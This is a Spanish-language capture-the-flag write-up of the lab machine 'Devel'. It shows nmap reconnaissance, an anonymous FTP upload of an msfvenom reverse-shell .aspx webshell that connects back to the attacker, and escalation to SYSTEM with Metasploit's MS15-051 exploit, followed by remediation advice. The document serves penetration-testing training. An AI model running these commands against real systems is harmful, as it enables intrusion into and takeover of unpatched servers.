Resumen

Devel es una cadena corta y muy didáctica: un FTP anónimo que escribe en la misma raíz que sirve el IIS, así que subimos una webshell .aspx y ya tenemos ejecución. El usuario es de bajos privilegios, pero es un Windows 7 sin ningún parche, así que la escalada es un exploit local directo a SYSTEM.

Vulnerabilidad

FTP anónimo con escritura sobre la raíz del IIS

El servidor FTP permite acceso anónimo y escribe en C:\inetpub\wwwroot, el mismo directorio que publica el IIS. Subir un fichero por FTP y pedirlo por HTTP equivale a ejecución remota de código.

CVE-2015-1701 (MS15-051)

Un fallo en win32k.sys al manejar objetos de cliente que permite a un usuario local elevar a SYSTEM. El Windows 7 de esta máquina no tiene ningún Service Pack, así que es vulnerable.

Reconocimiento

Búsqueda de puertos abiertos en la máquina víctima

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p- -Pn -sS -n --max-retries 1 devel
PuertoServicioVersión
21ftpMicrosoft ftpd
80httpMicrosoft IIS httpd 7.5

Dos puertos: un 21 (FTP) con acceso anónimo permitido y un 80 sirviendo IIS 7.5.

Enumeración

Entramos por FTP de forma anónima y comprobamos que el contenido coincide con el que sirve la web (están los iisstart.htm y welcome.png de la portada del IIS)

┌──(jaime㉿kali)-[~]└─$ ftp devel
Name: anonymous ftp> ls iisstart.htm welcome.png

Es decir, lo que subamos por FTP se publica en http://devel/. La vía es subir una webshell.

Explotación

Generamos una webshell inversa en .aspx y la subimos por FTP

┌──(jaime㉿kali)-[~]└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
┌──(jaime㉿kali)-[~]└─$ ftp devel
ftp> put shell.aspx

Con el listener preparado, pedimos la shell por HTTP y obtenemos ejecución como el usuario del pool de aplicaciones

┌──(jaime㉿kali)-[~]└─$ curl http://devel/shell.aspx
meterpreter > getuid Server username: IIS APPPOOL\Web

Escalada de privilegios

Somos iis apppool\web, un usuario de bajos privilegios. Hacemos una post-explotación básica para ver el estado de parches

C:\> systeminfo OS Version: 6.1.7600 N/A Build 7600

Un Windows 7 en la compilación 7600: sin ningún Service Pack. Pasamos la sesión a Meterpreter y tiramos del sugeridor de exploits locales

msf6 > use post/multi/recon/local_exploit_suggester msf6 post(local_exploit_suggester) > run
[+] exploit/windows/local/ms15_051_client_copy_image: vulnerable

Elegimos MS15-051, de los más fiables en esta versión, y nos hacemos con SYSTEM

msf6 > use exploit/windows/local/ms15_051_client_copy_image msf6 > set SESSION 1 msf6 > run meterpreter > getuid Server username: NT AUTHORITY\SYSTEM

Cómo se arregla

La cadena nace de una mala configuración del FTP y de un sistema sin parches, así que el arreglo va por capas:

  • Deshabilitar el FTP anónimo: y, sobre todo, nunca dejar que el FTP escriba en la raíz que publica el servidor web. Si hace falta FTP, que use un directorio aislado y autenticación.
  • Separar subida y ejecución: los directorios donde se pueden subir ficheros no deben tener permisos de ejecución de scripts del servidor (quitar el handler de ASPX en esa ruta).
  • Aplicar MS15-051 y actualizar: un Windows 7 sin Service Pack es vulnerable a decenas de exploits locales; mantener Windows Update al día cierra la escalada.
  • Principio de menor privilegio: aislar el pool de aplicaciones del IIS y limitar lo que puede hacer la cuenta de servicio.

Conclusiones

Un FTP anónimo con escritura no es grave por sí solo; lo es cuando escribe justo donde el servidor web ejecuta código. La combinación convierte una subida trivial en ejecución remota.

Conviene siempre comprobar si el contenido del FTP coincide con el de la web: es la pista que delata la ruta compartida.

Un sistema sin parches hace que la escalada sea un trámite. El local_exploit_suggester de Metasploit resuelve en segundos lo que de otro modo sería horas de enumeración manual hacia SYSTEM.
